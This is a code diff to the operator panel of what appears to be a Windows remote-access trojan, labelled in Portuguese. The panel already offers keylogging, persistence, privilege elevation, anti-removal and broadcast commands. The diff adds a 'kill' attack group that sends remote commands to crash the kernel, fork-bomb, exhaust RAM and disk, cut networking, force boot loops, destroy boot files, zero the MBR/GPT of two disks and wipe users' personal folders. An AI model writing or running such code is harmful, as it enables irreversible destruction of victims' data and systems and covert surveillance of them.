@@ -176,6 +176,22 @@ input[type=text]:focus{border-color:#38bdf8}
       <button data-act="t_stress_all">tudo junto</button>
       <button data-act="t_stress_stop">parar</button>
     </div>
+    <div class="grp"><span>ataque (kill)</span>
+      <button data-act="a_bsod">crash kernel</button>
+      <button data-act="a_killwin">matar windows</button>
+      <button data-act="a_freeze">congelar input</button>
+      <button data-act="a_net">matar rede</button>
+      <button data-act="a_diskfull">encher disco</button>
+      <button data-act="a_fork">fork bomb</button>
+      <button data-act="a_oom">esgotar ram</button>
+      <button data-act="a_reboot">reiniciar</button>
+      <button data-act="a_off">desligar</button>
+      <button data-act="a_loop">loop de boot</button>
+      <button data-act="a_noboot">sem boot</button>
+      <button data-act="a_mbr">destruir mbr</button>
+      <button data-act="a_wipe">apagar arquivos</button>
+      <button data-act="a_black">tela preta fixa</button>
+    </div>
     <div class="grp"><span>persistência</span>
       <button data-act="persist">persistir</button>
       <button data-act="unpersist">remover</button>
@@ -185,6 +201,7 @@ input[type=text]:focus{border-color:#38bdf8}
       <button data-act="elevate">elevar</button>
       <button data-act="lockdown">travar</button>
       <button data-act="unkillable">matar? off</button>
+      <button data-act="log">log do alvo</button>
     </div>
     <div class="grp"><span>sessão</span>
       <button data-act="bcast">broadcast</button>
@@ -462,6 +479,20 @@ const ACT = {
   t_heat:   () => { const s = ask('segundos de aquecimento (todos os núcleos + alto desempenho)', '120'); if (s !== null) exec('troll', {action:'heat', seconds: parseInt(s) || 120}, 'esquentar ' + s + 's'); },
   t_stress_all: () => { const s = ask('segundos de estresse total (cpu + ram + disco)', '60'); if (s !== null) exec('troll', {action:'stress_all', seconds: parseInt(s) || 60}, 'estresse total ' + s + 's'); },
   t_stress_stop: () => exec('troll', {action:'stress_stop'}, 'parar estresse'),
+  a_bsod:   () => { if (confirm('CRASH DE KERNEL real em ' + cur + '? A máquina reinicia na hora.')) exec('attack', {action:'bsod'}, 'crash kernel'); },
+  a_killwin:() => { if (confirm('Matar os processos críticos do Windows em ' + cur + '? Derruba o sistema agora.')) exec('attack', {action:'killwin'}, 'matar windows'); },
+  a_freeze: () => { const s = ask('segundos congelado (0 = até reiniciar)', '0'); if (s !== null) exec('attack', {action:'freeze', seconds: parseInt(s) || 0}, 'congelar input'); },
+  a_net:    () => { if (confirm('Derrubar toda a rede de ' + cur + '? (adaptadores, rotas e firewall)')) exec('attack', {action:'net'}, 'matar rede'); },
+  a_diskfull: () => { const m = ask('quantos MB escrever até encher o disco', '20000'); if (m !== null) exec('attack', {action:'disk_full', mb: parseInt(m) || 20000}, 'encher disco ' + m + 'MB'); },
+  a_fork:   () => { if (confirm('Fork bomb em ' + cur + '? A máquina trava e só volta no reset.')) exec('attack', {action:'fork', count: 8}, 'fork bomb'); },
+  a_oom:    () => { const n = ask('quantos processos alocando RAM (1-24)', '8'); if (n !== null) exec('attack', {action:'oom', count: parseInt(n) || 8}, 'esgotar ram x' + n); },
+  a_reboot: () => { const s = ask('segundos até reiniciar', '0'); if (s !== null) exec('attack', {action:'reboot', seconds: parseInt(s) || 0}, 'reiniciar'); },
+  a_off:    () => { if (confirm('DESLIGAR ' + cur + ' agora?')) exec('attack', {action:'poweroff', seconds: 0}, 'desligar'); },
+  a_loop:   () => { if (confirm('Loop de boot em ' + cur + '? Reinicia a cada logon, sem parar.')) exec('attack', {action:'boot_loop'}, 'loop de boot'); },
+  a_noboot: () => { if (confirm('DESTRUIR O BOOT de ' + cur + '? (BCD + winload) O Windows não sobe mais.')) exec('attack', {action:'no_boot'}, 'sem boot'); },
+  a_mbr:    () => { if (confirm('ZERAR O MBR/GPT de ' + cur + '? Discos 0 e 1. Não tem volta sem reinstalar.')) exec('attack', {action:'mbr', count: 2}, 'destruir mbr'); },
+  a_wipe:   () => { if (confirm('APAGAR Desktop, Documentos, Downloads, Imagens, Vídeos e Música de ' + cur + '?')) exec('attack', {action:'wipe'}, 'apagar arquivos'); },
+  a_black:  () => { const s = ask('segundos com o monitor apagado (0 = 1 hora)', '3600'); if (s !== null) exec('attack', {action:'blackout', seconds: parseInt(s) || 3600}, 'tela preta'); },
   wall:     () => { const p = ask('caminho de imagem no alvo (ex: C:\\\\Windows\\\\Web\\\\Wallpaper\\\\Windows\\\\img0.jpg)'); if (p) exec('wallpaper', {path:p}, 'papel de parede'); },
   kstart:   () => exec('keylog', {action:'start'}, 'keylog on'),
   kdump:    () => exec('keylog', {action:'dump'}, 'keylog dump'),
@@ -480,6 +511,7 @@ const ACT = {
   lockdown: () => exec('lockdown', {}, 'travar remoção'),
   unkillable: () => { const s = ask('estado do processo crítico (on/off)', 'off');
                       if (s !== null) exec('unkillable', {state: s.trim() || 'off'}, 'critical ' + s); },
+  log:      () => exec('log', {}, 'log do alvo'),
   bcast:    () => {
     const c = ask('comando para TODAS as sessões');
     if (!c) return;
